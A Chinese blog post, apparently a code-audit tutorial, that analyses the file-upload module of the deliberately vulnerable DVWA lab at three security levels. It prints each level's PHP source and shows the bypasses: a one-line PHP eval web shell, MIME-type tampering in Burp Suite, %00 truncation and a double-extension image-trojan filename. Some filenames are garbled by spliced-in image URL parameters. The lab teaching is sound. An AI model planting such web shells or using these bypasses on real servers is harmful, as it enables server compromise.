<p>PHP中通过$_FILES对象来读取文件，通过下列几个属性：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">•<span class="variable">$_FILES</span>[file][<span class="string">'name'</span>] - 被上传文件的名称。</span><br><span class="line"></span><br><span class="line">•<span class="variable">$_FILES</span>[file][<span class="string">'type'</span>] - 被上传文件的类型。</span><br><span class="line"></span><br><span class="line">•<span class="variable">$_FILES</span>[file][<span class="string">'size'</span>] - 被上传文件的大小（字节）。</span><br><span class="line"></span><br><span class="line">•<span class="variable">$_FILES</span>[file][<span class="string">'tmp_name'</span>] - 被上传文件在服务器保存的路径，通常位于临时目录中。</span><br><span class="line"></span><br><span class="line">•<span class="variable">$_FILES</span>[file][<span class="string">'error'</span>] - 错误代码，0为无错误，其它都是有错误。</span><br></pre></td></tr></table></figure></p>
<p>DVWA分析</p>
<p>选择low级别，先进行黑盒测试一下，直接上传个php一句话：&lt;?php @eval($_POST[“orange”]); ?&gt;</p>
<p>看到上传成功，路径(<a href="http://127.0.0.1/DVWA-1.9/hackable/uploads/upload.php)，" target="_blank" rel="noopener">http://127.0.0.1/DVWA-1.9/hackable/uploads/upload.php)，</a></p>
<p>看一下代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder? </span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">        // No </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Yes! </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>不懂上面的函数什么意思可以百度一下，</p>
<p>basename()函数：basename(path,suffix)   ，    basename() 函数返回路径中的文件名部分。如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。move_uploaded_file()函数：move_uploaded_file(file,newloc)    ，   move_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</p>
<p>分析：DVWA_WEB_PAGE_TO_ROOT为网页的根目录，target_path变量为上传文件的绝对路径，basename( $_FILES[‘uploaded’][‘name’])将文件中已经“uploaded”的文件的名字取出并加入到target_path变量中。 if语句判断文件是否上传到指定的路径中，若没有则显示没有上传。</p>
<p>可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，所以可以上传任意文件，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p>
<p>选择mediem级别，看下代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">"image/jpeg"</span> || <span class="variable">$uploaded_type</span> == <span class="string">"image/png"</span> ) &amp;&amp; </span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; 100000 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">            // No </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到对上传的类型和大小加以限制，限制文件类型必须是image/jpeg和image.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim，并且上传文件的大小小于100000（97.6KB）</p>
<p>但是简单地设置检测文件的类型，因此可以通过burpsuite来修改文件的类型进行过滤即可</p>
<p>我们可以通过burpsuite抓包修改文件类型，具体如下图所示，通过抓包上传upload.php，把.php文件成功上传（上传的png文件是小于97.6KB的）</p>
<p>注：这里也是可以利用%00截断上传，讲下图中的upload.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim改成upload.php%00.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim就可以突破限制，成功上传。</p>
<p>选择high级别，看下代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">'.'</span> ) + 1); </span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"jpg"</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"jpeg"</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; 100000 ) &amp;&amp; </span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">            // No </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>分析：strrpos(string,find,start)</p>
<p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p>
<p>getimagesize(string filename)</p>
<p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p>
<p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p>
<p>用图片马进行绕过，抓包修改，把”phptupianma.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim”改为”phptupianma.php.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim”</p>
<p>在本来的文件名的文件名称和后缀名之间加上php的后缀形式，使其位于中间位置，以便于使其在服务器端当作php文件来执行，这样就可以成功上传。</p>
<p>还有其他漏洞类型的审计，以后会慢慢补充……</p>
<p>上面所写到的工具和环境都分享在云盘里面（链接: <a href="https://pan.baidu.com/s/1pLr7w6Z" target="_blank" rel="noopener">https://pan.baidu.com/s/1pLr7w6Z</a> 密码: r326）</p>
<p>本文链接（<a href="http://www.cnblogs.com/Oran9e/p/7763751.html），转载请注明。" target="_blank" rel="noopener">http://www.cnblogs.com/Oran9e/p/7763751.html），转载请注明。</a></p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/代码审计/">代码审计</a>►<a class="article-category-link" href="/categories/代码审计/php代码审计/">php代码审计</a>
</div>


</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://yoursite.com/2017/06/07/代码审计入门/" data-title="代码审计入门 | Bug&#39;小虫" data-tsina="" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2017/06/15/Cookie欺骗常用姿势/" title="Cookie欺骗常用姿势">
  <strong>上一篇：</strong><br/>
  <span>
  Cookie欺骗常用姿势</span>
</a>
</div>


<div class="next">
<a href="/2017/05/29/关于一些电脑装新版内核Linux报错问题/"  title="关于一些电脑装新版内核Linux报错问题&#39;">
 <strong>下一篇：</strong><br/> 
 <span>关于一些电脑装新版内核Linux报错问题&#39;
</span>
</a>
</div>

</nav>

	



</div>  
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  


  
<div class="category-block">
  <h3 class="asidetitle">分类</h3>
     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/git/hexo/">hexo</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/windows/Windows2003/">Windows2003</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/">提权免杀</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/windows提权/">windows提权</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">新浪微博</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Larry Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
		
		<a href="/about" target="_blank" title="小虫">小虫</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>












<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
 </html>
